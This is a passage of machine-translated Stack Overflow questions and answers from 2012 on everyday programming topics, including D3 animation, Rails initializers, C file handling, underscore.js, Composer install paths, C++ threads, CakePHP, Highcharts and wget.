*   `[]`是一个字符类 - 允许在此表达式内匹配的任何字符
*   `A-Z`允许一系列大写字符
*   `a-z`允许一系列小写字符
*   `.`匹配句点而不是字符范围
*   `\s`匹配空格（空格和制表符）
*   `_`匹配下划线
*   `-`匹配破折号（连字符）；我们将它作为字符类中的最后一个字符，因此它不会被解释为字符范围的一部分。我们也可以转义它 ( `\-`) 并将其放在字符类中的任何位置，但这不太清楚
*   `+`断言前面的表达式（在我们的例子中是字符类）必须匹配*一次或多次*
*   `$`最后，这表明我们现在处于主题的结尾

当您测试正则表达式时，您可能会发现像[regexpal](http://regexpal.com/)这样的工具很有帮助。这使您可以在编写示例数据时实时查看正则表达式匹配（或匹配失败）。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-11-13T00:05:23.120

[在教程](http://www.regular-expressions.info/tutorial.html)中查看正则表达式的基础知识。它只需要两个[锚点](http://www.regular-expressions.info/anchors.html)和一个[重复的](http://www.regular-expressions.info/repeat.html) [字符类](http://www.regular-expressions.info/charclass.html)：

```
^[a-zA-Z ._-]*$ 
```

如果您使用不区分大小写的修饰符，则可以将其缩短为

```
^[a-z ._-]*$ 
```

请注意，空格很重要（它只是一个与其他字符一样的字符）。

# javascript - 无法使用 D3 使路径绘制缓慢增长

> ID：13353665
> 
> 赞同：15
> 
> 时间：2012-11-13T00:04:12.890
> 
> 标签：javascript, animation, svg, d3.js

使用 d3 图形库，我似乎无法使路径绘制缓慢，因此可以看到它们在增长。

[该站点](http://blog.visual.ly/creating-animations-and-transitions-with-d3-js/)在“折线图（展开）”部分中有一个完美的示例，但没有为该部分提供代码。有人可以帮我解决可能实现这一目标的 D3 代码行吗？

当我尝试在下面的代码片段中附加 delay() 或 duration() 时，路径仍会立即绘制，并且此段之后的所有 SVG 代码都无法呈现。

```
 var mpath = svg.append ('path');
        mpath.attr ('d', 'M35 48 L22 48 L22 35 L22 22 L35 22 L35 35 L48 35 L48 48')
             .attr ('fill', 'none')
             .attr ('stroke', 'blue')
             .duration (1000); 
```

* * *

## 回答 #1

> 赞同：49
> 
> 时间：2012-11-13T01:42:29.773

在 svg 中为线条设置动画时的一种常见模式是设置`stroke-dasharray`路径长度的 a ，然后设置 animate `stroke-dashoffset`：

```
var totalLength = path.node().getTotalLength();

path
  .attr("stroke-dasharray", totalLength + " " + totalLength)
  .attr("stroke-dashoffset", totalLength)
  .transition()
    .duration(2000)
    .ease("linear")
    .attr("stroke-dashoffset", 0); 
```

你可以在这里看到一个演示：http: [//bl.ocks.org/4063326](http://bl.ocks.org/4063326)

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2012-11-13T01:35:40.867

我相信执行此操作的“D3 方式”是使用自定义补间函数。你可以在这里看到一个有效的实现：http: [//jsfiddle.net/nrabinowitz/XytnD/](http://jsfiddle.net/nrabinowitz/XytnD/)

这假设您有一个名为 setup 的生成器`line`来`d3.svg.line`计算路径：

```
// add element and transition in
var path = svg.append('path')
    .attr('class', 'line')
    .attr('d', line(data[0]))
  .transition()
    .duration(1000)
    .attrTween('d', pathTween);

function pathTween() {
    var interpolate = d3.scale.quantile()
            .domain([0,1])
            .range(d3.range(1, data.length + 1));
    return function(t) {
        return line(data.slice(0, interpolate(t)));
    };
}​ 
```

这里的`pathTween`函数返回一个插值器，它采用给定的线切片，由我们通过转换的距离定义，并相应地更新路径。

不过，值得注意的是，我怀疑通过采用简单的方法可以获得更好的性能和更流畅的动画：`clipPath`在线条上放置一个白色矩形（如果你的背景很简单）或一个（如果你的背景很复杂），然后将其过渡到右侧以显示下面的线。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-13T01:11:16.617

根据您链接到的帖子，我想出了以下示例：

```
var i = 0,
    svg = d3.select("#main");

String.prototype.repeat = function(times) {
   return (new Array(times + 1)).join(this);
}

segments = [{x:35, y: 48}, {x: 22, y: 48}, {x: 22, y: 35}, {x: 34, y:35}, {x: 34, y:60}];
line = "M"+segments[0].x + " " + segments[0].y

new_line = line + (" L" + segments[0].x + " " + segments[0].y).repeat(segments.length);
 var mpath = svg.append ('path').attr ('d',new_line )
             .attr ('fill', 'none')
             .attr ('stroke', 'blue')

for (i=0; i<segments.length; i++)
    {
    new_segment = " " + "L"+segments[i].x + " " + segments[i].y
    new_line = line + new_segment.repeat(segments.length-i)
    mpath.transition().attr('d',new_line).duration(1000).delay(i*1000);
    line = line + new_segment

    } 
```

这有点难看，但有效。你可以在[jsFiddle上看到它](http://jsfiddle.net/m7EZr/2/)

# ruby-on-rails-3 - 运行`rails generate`时如何防止初始化程序运行

> ID：13353666
> 
> 赞同：6
> 
> 时间：2012-11-13T00:04:17.990
> 
> 标签：ruby-on-rails-3, initialization

我想用初始化程序预填充我的缓存，但我不需要每次运行`rake`或运行时都运行此代码`rails g`等。Rake 和 Bundler 很容易处理，但类似的解决方案不适用于生成器：

```
# config/initializers/prepop_cache.rb
if !defined?(::Bundler) and !defined?(::Rake) and !defined(Rails::Generators)
  # do stuff
end 
```

这一定是因为`rails/generators`（或类似的东西）是`require`在运行时编辑的。如何检查正在运行的命令是否是`rails g xyz`？

更新：

在这里可以找到两个解决方案： [Rails 3 初始化程序，仅在“rails server”而不是“rails generate”等上运行](https://stackoverflow.com/questions/8660019/rails-3-initializers-that-run-only-on-rails-server-and-not-rails-generate-e)

仍然想知道是否可以按照我上面尝试的方式进行。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-09-25T19:18:21.417

在**Rails 3**中，您想要做的事情是可以想象的，但是以一种 hacky 的方式。就是这样：

当您`rails generate`拨打电话时，呼叫路径如下所示：

*   [bin/rails](https://github.com/rails/rails/blob/3-0-stable/bin/rails)被调用，最终路由你[执行 script/rails](https://github.com/rails/rails/blob/3-0-stable/railties/lib/rails/script_rails_loader.rb#L8-L19)
*   [执行脚本/rails](https://github.com/rails/rails/blob/3-0-stable/railties/lib/rails/generators/rails/app/templates/script/rails)需要[rails/commands](https://github.com/rails/rails/blob/3-0-stable/railties/lib/rails/generators/rails/app/templates/script/rails#L5)
*   [rails/commands](https://github.com/rails/rails/blob/3-0-stable/railties/lib/rails/commands.rb)已加载，这是重点。

在[rails/commands](https://github.com/rails/rails/blob/3-0-stable/railties/lib/rails/commands.rb)中运行生成的代码：

```
ARGV << '--help' if ARGV.empty?

aliases = {
  "g"  => "generate",
  "c"  => "console",
  "s"  => "server",
  "db" => "dbconsole"
}

command = ARGV.shift                       # <= #1
command = aliases[command] || command

case command
when 'generate', 'destroy', 'plugin', 'benchmarker', 'profiler'
  require APP_PATH
  Rails.application.require_environment!   # <= #2
  require "rails/commands/#{command}"      # <= #3 
```

兴趣点在上面编号。也就是说，此时`#1`您正在运行的命令正在从`ARGV`. 在您的情况下，这意味着`generate`将从命令行参数中删除。

此时`#2`您的环境被加载，此时您的初始化程序将被执行。这是困难的部分 - 因为此时没有任何指示特定命令已加载（这发生在`#3`），因此没有确定生成器正在运行的信息！

让我们插入一个脚本`config/initializer/debug.rb`来看看如果我们运行什么是可用的`rails generate model meep`：

```
puts $0     #=> "script/rails"
puts ARGV   #=> ["model", "meep"] 
```

如您所见，没有直接信息表明正在运行生成器。也就是说，有间接信息。即`ARGV[0] #=> "model"`. 可以想象，您可以创建一个可能的生成器列表并检查该生成器是否已被调用`ARGV[0]`。我负责的开发人员说这是一种黑客攻击，可能会以你意想不到的方式破坏，所以我会谨慎使用它。

唯一的其他选择是按照`script/rails`您的建议进行修改-这不是一个太糟糕的解决方案，但是当您升级到 Rails 4 时可能会中断。

* * *

在**Rails 4**中，您有更多希望！在[加载应用程序环境](https://github.com/rails/rails/blob/master/railties/lib/rails/commands/commands_tasks.rb#L133)时，生成器命名空间已经加载。这意味着在初始化程序中，您可以执行以下操作：

```
if defined? Rails::Generators   #=> "constant"
  # code to run if generators loaded
else
  # code to run if generators not loaded
end 
```

# c - 如何应用矩阵 - 理解请求

> ID：13353669
> 
> 赞同：0
> 
> 时间：2012-11-13T00:04:37.907
> 
> 标签：c, matrix

假设我有一个立方体

```
P1(0, 0, 0) P5(0, 0, 1)
P2(1, 0, 0) P6(1, 0, 1)
P3(0, 1, 0) P7(0, 1, 1)
P4(1, 1, 0) P8(1, 1, 1) 
```

现在我需要应用变换/旋转/缩放矩阵。说，

```
transform = Pt(3, 3, 5)
rotation = 30º
scale = 2x` 
```

好的。但是，为了得到最终结果，我应该将这些值中的每一个放在哪里？这让我很困惑。

**编辑**

可以说，对于 P2，我有：

```
| 1 |   | a b c |
| 0 | x | d e f | = R
| 0 |   | g h i | 
```

但我有`a,b,c,d,...i`什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T00:16:47.997

要通过单个操作完成此操作，您需要一个 4x4 矩阵。查看[http://www.engineering.uiowa.edu/~ie_246/Lecture/OpenGLMatrices.ppt](http://www.engineering.uiowa.edu/~ie_246/Lecture/OpenGLMatrices.ppt)了解一些详细信息和示例。

最后你像这样链接转换

```
point[i] = T1*T2*T3*..*vertex[i] 
```

![PDF 转换](../Images/30ca63f421816127ef64d8902b4e3368.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T00:09:18.973

立方体角上的 8 个点中的每一个都是一个 3x1 向量。您的矩阵变换是 3x3 矩阵。

绕什么轴旋转？这将改变旋转矩阵的样子。以下是关于 x 轴的内容：

```
 | +cos(theta) -sin(theta)  0 | 
Rx = | +sin(theta) +cos(theta)  0 |
     | 0           0            1 | 
```

比例很简单：将所有 x 坐标乘以 2。

```
 | 2  0  0 |
S = | 0  1  0 |
    | 0  0  1 | 
```

将这些应用于您的每个点。

# c - 指向数组中的文件时，fread 中的 Coredump

> ID：13353672
> 
> 赞同：2
> 
> 时间：2012-11-13T00:04:45.617
> 
> 标签：c, fread, coredump

最近开始使用指针并创建了一个小脚本，应该将一些文本文件拼接在一起。

但是，当我尝试调用 fputs 时，我得到一个核心转储/分段错误。我怀疑这是因为文件指针的保存方式。我发现文件将其保存在一个数组中，并稍后尝试检索它。

FILE 指针保存在结构中。有人会立即发现我的错吗？我会很感激！

结构：

```
typedef struct{
int listSize;
int listCapacity;
FILE *fileStream;
}FileList; 
```

创建结构

```
FileList fileList;
fileList.listSize=0;
fileList.listCapacity=1;
fileList.fileStream=calloc(fileList.listCapacity,sizeof(FILE)); 
```

然后我通过调用将结构添加到数组中

```
void addFile(FileList* list, FILE* file)
{
    list->fileStream[list->listSize]=*file;
} 
```

但是，当我打电话时

```
char* buffer[10];
size_t result=0;

result = fread(buffer,1,10,&fileList.fileStream[ii+currentGroupOffset]);
    fputs(*buffer,outPutFile); 
```

它崩溃了，我试图观察值 ii+currentGroupOffset 确保它不会超出数组范围

有任何帮助！:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T00:11:20.907

It seems you want a dynamically allocated array of `FILE*` elements. You have:

```
FILE *fileStream; 
```

That can either be treated as a `FILE` pointer, or an array of `FILE` elements. But not as an array of `FILE` pointers. For that, you need:

```
FILE **fileStream; 
```

And allocating the array should be done with:

```
fileList.fileStream=calloc(fileList.listCapacity,sizeof(FILE*)); 
```

`FILE` is not a type you use directly. You always deal with pointers to it. You should treat it as an opaque type.

Also, I don't see where you actually open the files (using `fopen()`) anywhere in your code.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T00:13:53.950

Why

```
char * buffer[10]; 
```

It should be

```
char buffer[10]; 
```

Where is `list->listSize` incremented?

I don't understand what this is

```
 fileList.fileStream=calloc(fileList.listCapacity,sizeof(FILE)); 
```

`FILE *`s are initialized by calling `fopen` not by allocating memory

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-13T00:18:04.230

您不能自己分配和复制`FILE`结构 - 它是一种不透明的数据类型。因此，与其创建一个`FILE`结构数组，不如创建一个`FILE *`指针数组：

```
typedef struct {
    int listSize;
    int listCapacity;
    FILE **fileStream;
} FileList;

FileList fileList;

fileList.listSize = 0;
fileList.listCapacity = 1;
fileList.fileStream = calloc(fileList.listCapacity, sizeof fileList.fileStream[0]); 
```

然后`FILE *`通过复制指针值来添加指向数组的指针：

```
void addFile(FileList *list, FILE *file)
{
    list->fileStream[list->listSize] = file;
} 
```

并像这样使用它：

```
char buffer[10];
size_t result = 0;

result = fread(buffer, 1, 10, fileList.fileStream[ii+currentGroupOffset]);
fwrite(buffer, 1, result, outPutFile); 
```

# javascript - 如何在 underscorejs 中转置对象

> ID：13353674
> 
> 赞同：9
> 
> 时间：2012-11-13T00:04:55.743
> 
> 标签：javascript, underscore.js, transpose

在 JavaScript 中，我试图转换具有相似键的对象数组：

```
[{'a':1,'b':2}, {'a':3,'b':4}, {'a':5,'b':6,'c':7}] 
```

到具有每个键的值数组的对象：

```
{'a':[1,3,5], 'b':[2,4,6], 'c':[7]}; 
```

使用 underscore.js 1.4.2。

我在下面有一些工作代码，但感觉比编写嵌套的 for 循环更长更笨重。

有没有更优雅的方式在下划线中做到这一点？我缺少一些简单的东西吗？

```
console.clear();

var input = [{'a':1,'b':2},{'a':3,'b':4},{'a':5,'b':6,'c':7}];
var expected = {'a':[1,3,5], 'b':[2,4,6], 'c':[7]};

// Ok, go
var output = _(input)
.chain()
// Get all object keys
.reduce(function(memo, obj) {
    return memo.concat(_.keys(obj));
}, [])
// Get distinct object keys
.uniq()
// Get object key, values
.map(function(key) {
    // Combine key value variables to an object  
    // ([key],[[value,value]]) -> {key: [value,value]}
    return _.object(key,[
        _(input)
        .chain()
        // Get this key's values
        .pluck(key)
        // Filter out undefined
        .compact()
        .value()
    ]);
})
// Flatten array of objects to a single object
// [{key1: [value]}, {key2, [values]}] -> {key1: [values], key2: [values]}
.reduce(function(memo, obj) {
    return _.extend(memo, obj);
}, {})
.value();

console.log(output);
console.log(expected);
console.log(_.isEqual(output, expected)); 
```

谢谢

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-13T00:36:11.170

听起来你想要`zip`对象。这将是对象的[类似](http://documentcloud.github.com/underscore/docs/underscore.html#section-50)方法：

```
_.transpose = function(array) {
    var keys = _.union.apply(_, _.map(array, _.keys)),
        result = {};
    for (var i=0, l=keys.length; i<l; i++) {
        var key = keys[i];
        result[key] = _.pluck(array, key);
    }
    return result;
}; 
```

但是，我只会使用

```
_.transpose = function(array) {
    var result = {};
    for (var i=0, l=array.length; i<l)
        for (var prop in array[i]) 
             if (prop in result)
                 result[prop].push(array[i][prop]);
             else
                 result[prop] = [ array[i][prop] ];
    return result;
}; 
```

根本没有任何下划线:-)当然，您可以使用一些迭代器方法，它可能看起来像

```
_.reduce(array, function(map, obj) {
    return _.reduce(obj, function(map, val, key) {
        if (key in map)
            map[key].push(val)
        else
            map[key] = [val];
        return map;
    }, map);
}, {}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-03-08T19:15:43.887

您可以使用 lodash 的 zipObject 方法：[https ://lodash.com/docs#zipObject](https://lodash.com/docs#zipObject)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-09-03T08:03:21.547

你需要 3 行 lodash：

```
_.merge.apply(null, _.union([{}], myArrayOfObjects, [function (a, b) {
    return _.compact(_.flatten([a, b]));
}])) 
```

有关该函数作用的更多详细信息，请参阅[的文档。`_.merge`](https://lodash.com/docs#merge)

# spring - Spring Security如何在Grails中调用remoteFunction时重定向到登录

> ID：13353677
> 
> 赞同：1
> 
> 时间：2012-11-13T00:04:59.810
> 
> 标签：spring, grails, spring-security, grails-plugin, grails-2.0

当未登录的用户单击包含 remoteFunction 的链接时，例如：

```
 <a href="#" onclick="${remoteFunction(
           controller: 'book',
           action: 'count',
        id: book.id,
        onSuccess: 'updateBookCount(data,textStatus);'
        )}">
        add count to book
        </a> 
```

对于一个动作：

```
@Secured("ROLE_USER")
def count() { ... } 
```

如果用户未登录，如何将用户重定向到登录页面？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T14:04:20.463

也许有比我目前拥有的更好的解决方案，但我过去遇到过这种情况，ajax 调用不会调用 spring 安全性在会话过期时执行的正常重定向。我将 contextPath 分配给 main.gsp 中的 javascript 变量。这将在会话到期前 5 秒将用户注销。

在标题的 main.gsp 中，我有：

```
<script type="text/javascript">
    var contextPath = "${contextPath}";
    var maxTimeout = ${session.getMaxInactiveInterval()};
</script> 
```

在我的 main.js 中，我有：

```
if ( contextPath + "/" != window.location.pathname )
{
    setInterval('checkTimeOut()', 1000 );
}

function checkTimeOut()
{
    maxTimeout -= 1;
    if (maxTimeout <= 5)
        window.location = contextPath+"/logout"

} 
```

# php - 使用 composer 在自定义目录中安装包

> ID：13353678
> 
> 赞同：14
> 
> 时间：2012-11-13T00:05:06.823
> 
> 标签：php, symfony, composer-php

我看到已经有一个问题，但它没有回答这个问题

*   [如何将 composer 包安装到 /src 目录中？](https://stackoverflow.com/questions/11105273/how-can-i-install-a-composer-package-into-the-src-dir)

如何在`/src`目录中安装捆绑包？

我想这样做的原因是为了开发和部署，所以

*   我不必将 Symfony 的基本代码签入我的 subversion repo
*   我可以使用 Composer 来部署

查看 Composer 文档，我确实遇到了这个：

*   [http://getcomposer.org/doc/04-schema.md#config](http://getcomposer.org/doc/04-schema.md#config)

> **供应商目录**：默认为供应商。如果需要，您可以将依赖项安装到不同的目录中。

我可以将其设置为 Bundle 级别吗？或者这是整体安装？

*   [https://github.com/composer/composer/blob/master/res/composer-schema.json](https://github.com/composer/composer/blob/master/res/composer-schema.json)

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2015-01-01T23:26:33.480

我知道这已经晚了，但如果有人正在寻找我**辛辛苦苦**（几个小时）找到的答案：`vendor-dir`

文档说：

> 通过设置此 var，您可以让 composer 将依赖项安装到 vendor 以外的目录中

例子：

```
{
    "config": {
        "vendor-dir": "website/password/vendor/"
    }
} 
```

从[这个文档](https://getcomposer.org/doc/04-schema.md#config)和[这个文档](https://getcomposer.org/doc/03-cli.md#composer-vendor-dir)

再次，希望为其他人节省几个小时。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2013-11-22T10:20:25.777

```
{
    "extra": {
        "installer-paths": {
            "sites/example.com/modules/{$name}": ["vendor/package"]
        }
    }
} 
```

[阅读更多。](http://getcomposer.org/doc/faqs/how-do-i-install-a-package-to-a-custom-path-for-my-framework.md)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2014-02-06T20:42:15.437

我已经实现了这个作曲家插件来将包安装到用户（自定义）定义的文件夹中，您可以将其包含在您的 composer.json 中，按照示例并告诉我您是否有更多问题 :)

[https://github.com/mnsami/composer-custom-directory-installer](https://github.com/mnsami/composer-custom-directory-installer)

# 作曲家自定义目录安装程序

一个作曲家插件，用于在文件夹中默认作曲家默认安装路径之外的自定义目录中安装不同类型的作曲家包`vendor`。

这不是另一个`composer-installer`支持非作曲家包类型的库，即`application`..等。这只是为了增加在供应商文件夹之外安装作曲家包的灵活性。这个包只支持`composer`包类型，

[https://getcomposer.org/doc/04-schema.md#type](https://getcomposer.org/doc/04-schema.md#type)

> 包的类型。它默认为库。
> 
> 包类型用于自定义安装逻辑。如果你有一个包需要一些特殊的逻辑，你可以定义一个自定义类型。这可能是一个 symfony-bundle、一个 wordpress-plugin 或一个typo3-module。这些类型都特定于某些项目，它们需要提供能够安装该类型包的安装程序。

## 如何使用

*   将作曲家插件包含到您的`composer.json` `require`部分中::

```
"require":{
    "php": ">=5.3",
    "mnsami/composer-custom-directory-installer": "1.1.*",
    "monolog/monolog": "*"
  } 
```

*   在该`extra`部分中定义要安装的包的自定义目录::

```
 "extra":{
    "installer-paths":{
      "./monolog/": ["monolog/monolog"]
    } 
```

通过添加该`installer-paths`部分，您告诉作曲家将`monolog`包安装`monolog`在根目录的文件夹中。

*   作为一项新增功能，我们在定义您的下载目录时增加了更多灵活性，例如`composer/installers`，换句话说，您可以在您的部分中使用`{$vendor}`和等变量：`{$name}``installer-path`

```
"extra": {
    "installer-paths": {
        "./customlibs/{$vendor}/db/{$name}": ["doctrine/orm"]
    }
} 
```

以上将设法将`doctrine/orm`包安装在项目的根文件夹中，在`customlibs`.

## 笔记

`type: project`此安装程序不支持Composer ，因为具有类型的包`project`仅适用于与应用程序外壳（如`symfony/framework-standard-edition`）一起使用，其他包需要。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2015-04-14T05:27:49.950

如果您发现 composer 的自定义安装程序过于复杂或死板，并且您可以计划将部署到哪些类型的系统，您可以考虑使用安装后脚本。

这是一个示例，它从安装在供应商下的软件包创建符号链接到可能预期的位置：

```
"scripts": {
    "post-install-cmd": [
        "test -d vendor/foo/bar && ln -s ../vendor/foo/bar lib/bar"
    ]
} 
```

这将创建一个`lib/bar/`指向的符号链接`vendor/foo/bar/`。

# c++ - 从本机句柄创建 std::thread？

> ID：13353680
> 
> 赞同：5
> 
> 时间：2012-11-13T00:05:16.850
> 
> 标签：c++, c++11

如果我有一个`std::thread`对象`t`，我可以使用`t.native_handle()`它来访问底层线程实现的 API（例如，pthreads 或 Windows 线程）。但是如果我有一个来自底层线程实现的句柄（例如，一个 pthreads 线程）。有什么方法可以将其转换为 C++11`std::thread`吗？

这样做的动机是，可能需要使用本机平台线程 API 来设置具有特定亲和力或特定堆栈大小（或某些其他无法通过 C++11 API 访问的特性）的线程）。但是，从那时起，最好坚持使用 C++11 功能。

有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-13T00:31:02.277

使用 GCC，您可以`std::thread::id`从 a构造 a，`std::thread::native_handle_type`但不能`std::thread`从它构造 a。

这意味着您可以测试给定是否与对象（或指向）`pthread_t`引用相同的线程，但您不能从中创建新对象。`std::thread``this_thread::get_id()``thread`

A`std::thread`被设计为线程的*唯一*句柄。不同对象获取底层线程所有权的唯一方法`thread`是将其从原始线程中移出，因此只有一个对象一次“拥有”它。如果您可以从本机句柄构造它们，您可以这样做：

```
// start new thread
std::thread t(&thread_func);

// now have two handles to the same thread
std::thread t2( t.native_handle() );

std::thread t1.join();

// erm, hang on, this isn't right
std::thread t2.join(); 
```

> 这样做的动机是，可能需要使用本机平台线程 API 来设置具有特定亲和力或特定堆栈大小（或某些其他无法通过 C++11 API 访问的特性）的线程）。

理想情况下，平台将允许您在构造线程时指定参数，例如亲和力或堆栈大小，这将允许您使用这些特定于平台的功能，而不会通过构造“非拥有”`thread`对象来削弱类型系统......但至少GCC 不支持这样做。

# cakephp - 元素或视图扩展或其他东西？参考应用？

> ID：13353682
> 
> 赞同：0
> 
> 时间：2012-11-13T00:05:35.617
> 
> 标签：cakephp, implementation

在 cakephp [2.2] 中，我已经烘焙了所有内容，我的“人”视图非常忙于处理关系、电话、地址和其他相关数据。我确实希望所有这些信息都在人员视图中可见，尽管在烘焙布局中并不完全。

1.  我应该如何处理相关数据的那些部分？我不确定我是否应该使用元素或扩展视图或插件或什么，我对此有点陌生，并且文档对我（在我的水平）来说并不清楚应该在什么时候使用。烘焙代码似乎是一种单一的方法，所以我没有得到太多帮助。
2.  一旦用户选择从人员视图的列表中编辑电话号码（例如），它会将他们带到电话编辑视图，然后将它们返回到电话列表（索引视图）而不是他们所在的人员视图. 我如何让他们回到人员视图？
3.  他们提供的博客示例很好，但是在某处是否有一个用于 cakephp 的“参考”应用程序，它展示了各种功能的最佳实践？我找不到一个，或者只是一个简单的应用程序示例。

谢谢，我很感激指导。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T10:13:44.653

这是一个相当广泛的问题，但我将尝试回答它。我不确定你的编程知识有多先进，所以如果我重复你已经知道的事情，请原谅我。首先，当我第一次开始使用该框架时，[这篇文章给了我很大的帮助，因为它解释了哪些代码应该去哪里以及为什么。](http://bakery.cakephp.org/articles/Auzigog/2008/12/29/where-should-my-code-go)这是我见过的最接近“参考应用程序”的工具，它实际上是一个很棒的学习工具。您可以尝试查看一些更高级的 Cake 应用程序，例如[Croogo](http://croogo.org)（基于 Cake 的 CMS）。但是代码库肯定会有点复杂。

当你想在不同的视图中实际重用元素时，我个人会使用元素。然而，问题在于为元素提供数据。有一种方法叫做[`requestAction`](http://book.cakephp.org/2.0/en/controllers.html#Controller%3a%3arequestAction)，但即使是手册也指出这应该适度使用并与缓存结合使用。问题在于，在不同元素中使用大量`requestAction`调用会使您的控制器充满方法，并且不遵守[“瘦控制器，胖模型”](http://bitfluxx.com/2008/01/23/cakephp-best-practices-fat-models-and-skinny-controllers.html)的口头禅。

我会将大部分相关的数据调用放在它们各自的模型中，并从控制器调用这些模型方法并将它们提供给视图。因此，假设您想要 10 个最新的电话号码和相关用户。

您的 PhoneNumber 模型中有一个方法，该方法返回一组用户及其电话号码。使用[Containable 行为](http://book.cakephp.org/2.0/en/core-libraries/behaviors/containable.html)来限制返回的相关模型的数量。下面的代码是一个示例，因此实际实现可能会有所不同：

```
public function getRecentPhoneNumbers($limit=10) {
  $phoneNumbers = array();

  $phoneNumbers = $this->find('all', array(
    'limit' => $limit,
    'contain' => array('User'),
    'order' => 'PhoneNumber.id DESC'
  ));

  return $phoneNumbers;
} 
```

如果 PhoneNumber 和 User 模型正确相关，您将能够`getRecentPhoneNumbers()`从 User 模型调用：

`$this->PhoneNumber->getRecentPhoneNumbers(10)`

或从用户控制器：

`$this->User->PhoneNumber->getRecentPhoneNumbers(10)`

假设您有一个元素显示这 10 个数字的列表，并且它接受一个名为 的变量`$recentPhonenumbers`，然后您使用调用返回的数组在相关的 UsersController 方法中设置该变量`getRecentPhoneNumbers`：

```
$this->set('recentPhonenumbers', $this->User->PhoneNumber->getRecentPhoneNumbers(10)); 
```

这将使它对包含该元素的视图可用。

扩展视图相对较新（从 Cake 2.1 起），我没有使用过它们，但似乎是创建条件标记的好方法。

至于第二个问题，将用户重定向到人员视图，而不是索引视图。这是在 Controller 的方法中调整重定向的问题（有关详细信息，[请参阅手册）。](http://book.cakephp.org/2.0/en/controllers.html#Controller%3a%3aredirect)`edit()`标准烘焙的 edit() 方法接受一个`$id`参数，您可以使用它来重定向到`view()`（它可能也接受一个`$id`参数）。

所以重定向可能看起来像这样：

```
$this->redirect(array('controller' => 'users', 'action' => 'index')); 
```

将其更改为：

```
$this->redirect(array('controller' => 'users', 'action' => 'view', $id)); 
```

# javascript - Javascript中的嵌套/多级/向下钻取饼图？

> ID：13353683
> 
> 赞同：5
> 
> 时间：2012-11-13T00:05:37.273
> 
> 标签：javascript, charts, highcharts, pie-chart

我正在尝试使用 javascript 创建一个饼图，该饼图将允许用户单击一个切片并“查看构成该切片的内容”。如果您曾经使用过 mint.com，您就会明白我的意思 - 假设您正在查看费用饼图并单击“汽车”切片，然后您会看到切片扩展为新的燃气、维护图表，等等

为了更进一步，我正在处理大量数据，因此能够在单击切片时获取（ajax）新数据也是一个有用的选项（尽管我可能没有它就可以逃脱）。

也许“嵌套”、“多级”和“向下钻取”不是正确的术语，因为我整天都在搜索，似乎找不到解决方案。

有谁知道这个图书馆？提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-15T17:33:28.783

我已经使用 HighCharts 点单击事件实现了类似的向下钻取系统。这是粗略的语法：

```
var chart = new Highcharts.Chart({
    chart: {
        renderTo: 'container',
        type: 'pie'
    },
    series: [{
        data: myInitialDataArray, // make sure each data point has an id
        point: {
            events: {
                click: function () {
                    $.post('/get/data/by/id/' + this.id, function(data) {
                        // you may need to format your data here
                        chart.series[0].setData(data);
                    });
                }
            }
        }
    }]
}); 
```

在此示例中，您定义了一个单击事件，该事件使用点的 id 值 (this.id) 执行到 URL 的 Ajax 发布。然后，您使用帖子中的数据重新绑定图表系列。

请注意，每次使用 setData 函数更新图表时，每个数据点都需要有一个 id 值才能继续向下钻取。

希望这可以帮助！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-08-11T17:28:56.043

试试 psd3 饼图库
Demo - [https://pshivale.github.io/psd3](https://pshivale.github.io/psd3)
源码 - [https://github.com/pshivale/psd3](https://github.com/pshivale/psd3)
它支持多级饼图、圆环图和旭日形图。它还支持通过双击向下钻取饼图。

# wget - wget 下载名称

> ID：13353684
> 
> 赞同：1
> 
> 时间：2012-11-13T00:05:40.233
> 
> 标签：wget

我想写一个函数，给定一个 URL，返回由`wget URL`.

我不太了解的行为`wget`。如果我执行`wget`、`python.org`、或`www.python.org`，下载的文件的名称是.`http://www.python.org``http://www.python.org/``index.html`

但是，如果我这样做`www.python.org/about`，下载的文件的名称是`about`，而不是`index.html`.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T00:54:59.263

`wget`您在第一种情况下获取的原因`index.html`是因为这是服务器指向的默认“主页”。`python.org`, `www.python.org`, `http://www.phython.org`, and `http://www.python.org/`are not 文件，所以服务器`wget`指向`index.html`. 它也将您的浏览器指向那里，尽管您通常看不到它。`www.python.org/about`是一个不同的页面，因此它下载的文件具有不同的名称是有道理的。

如果您想知道它是如何工作的，我可以推荐 wget 的[手册页吗？](http://linux.die.net/man/1/wget)如果它是您所关心的下载文件的名称，您可以通过选项更改它`-O`。

# php - 使用 Drupal 6 是否有类似于 'drupal_set_header()' 的 php 行来设置 'head_title'？

> ID：13353690
> 
> 赞同：0
> 
> 时间：2012-11-13T00:06:00.640
> 
> 标签：php, drupal, drupal-6

在 Drupal 6 中是否有一行类似于 'drupal_set_header()' 的 php 从给定页面的正文中设置 'head_title'？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T18:56:59.617

尝试

```
drupal_set_title("Your title goes here....") 
```

更多详情：[http ://api.drupal.org/api/drupal/includes!path.inc/function/drupal_set_title/6](http://api.drupal.org/api/drupal/includes!path.inc/function/drupal_set_title/6)

# javascript - 自动点击提交按钮

> ID：13353693
> 
> 赞同：-2
> 
> 时间：2012-11-13T00:06:06.663
> 
> 标签：javascript, html

